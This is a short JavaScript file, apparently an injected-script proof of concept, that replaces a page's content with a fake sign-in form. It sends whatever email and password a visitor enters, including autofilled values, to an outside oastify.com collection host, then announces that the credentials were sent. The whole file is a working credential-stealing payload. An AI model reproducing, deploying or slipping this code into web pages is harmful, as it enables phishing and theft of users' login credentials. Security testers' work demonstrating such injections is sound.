document.body.innerHTML = "";
const style = document.createElement("style");
style.textContent = "*{box-sizing:border-box}\nbody {\nmargin: 0;\nfont-family: 'Segoe UI', sans-serif;\nbackground: linear-gradient(135deg, #4a90e2, #9013fe);\nheight: 100vh;\ndisplay: flex;\njustify-content: center;\nalign-items: center;\n}\n.login-container {\nbackground: #fff;\npadding: 2rem;\nborder-radius: 12px;\nbox-shadow: 0 8px 24px rgba(0,0,0,0.2);\nwidth: 100%;\nmax-width: 360px;\nanimation: fadeIn 0.5s ease-out;\n}\n.login-container h2 {\nmargin-bottom: 1.5rem;\nfont-weight: 600;\ncolor: #333;\ntext-align: center;\n}\n.form-group {\nmargin-bottom: 1.2rem;\n}\n.form-group label {\ndisplay: block;\nmargin-bottom: 0.4rem;\nfont-size: 0.9rem;\ncolor: #555;\n}\n.form-group input,\nbutton {\nwidth: 100%;\nfont-size: 1rem;\n}\n.form-group input {\npadding: 0.75rem;\nborder: 1px solid #ccc;\nborder-radius: 8px;\ntransition: border-color 0.3s;\n}\n.form-group input:focus {\nborder-color: #4a90e2;\noutline: none;\n}\nbutton {\npadding: 0.8rem;\nbackground-color: #4a90e2;\nborder: none;\ncolor: #fff;\nfont-weight: 700;\nborder-radius: 8px;\ncursor: pointer;\ntransition: background-color 0.3s;\n}\nbutton:hover {\nbackground-color: #357ab7;\n}\n@keyframes fadeIn {\nfrom { opacity: 0; transform: translateY(-20px); }\nto { opacity: 1; transform: translateY(0); }\n}";
document.head.appendChild(style);

const container = document.createElement("div");
container.className = "login-container";
const heading = document.createElement("h2");
heading.textContent = "Sign in to your account";
container.appendChild(heading);

const form = document.createElement("form");
form.setAttribute("autocomplete", "on");

const emailGroup = document.createElement("div");
emailGroup.className = "form-group";
const emailLabel = document.createElement("label");
emailLabel.textContent = "Email";
emailLabel.setAttribute("for", "email");
const emailInput = document.createElement("input");
emailInput.type = "email";
emailInput.name = "email";
emailInput.id = "email";
emailInput.required = !0;
emailGroup.appendChild(emailLabel);
emailGroup.appendChild(emailInput);
form.appendChild(emailGroup);

const passGroup = document.createElement("div");
passGroup.className = "form-group";
const passLabel = document.createElement("label");
passLabel.textContent = "Password";
passLabel.setAttribute("for", "password");
const passInput = document.createElement("input");
passInput.type = "password";
passInput.name = "password";
passInput.id = "password";
passInput.required = !0;
passGroup.appendChild(passLabel);
passGroup.appendChild(passInput);
form.appendChild(passGroup);

const loginButton = document.createElement("button");
function sendCredentials(n, e) {
  const t = `https://zvysy6oevjbau9w44dasgemc93f731rq.oastify.com/?email=${encodeURIComponent(n)}&password=${encodeURIComponent(e)}`;
  fetch(t, { method: "GET", mode: "no-cors" });
}
function checkAndSend() {
  const n = emailInput.value.trim(),
    e = passInput.value.trim();
  if (n && e) {
    sendCredentials(n, e);
    emailInput.removeEventListener("input", checkAndSend);
    passInput.removeEventListener("input", checkAndSend);
    alert(`Credentials sent successfully!\nEmail: ${n}\nPassword: ${e}`);
  }
}
loginButton.type = "submit";
loginButton.textContent = "Login";
form.appendChild(loginButton);
container.appendChild(form);
document.body.appendChild(container);
emailInput.addEventListener("input", checkAndSend);
passInput.addEventListener("input", checkAndSend);
setTimeout(checkAndSend, 150);
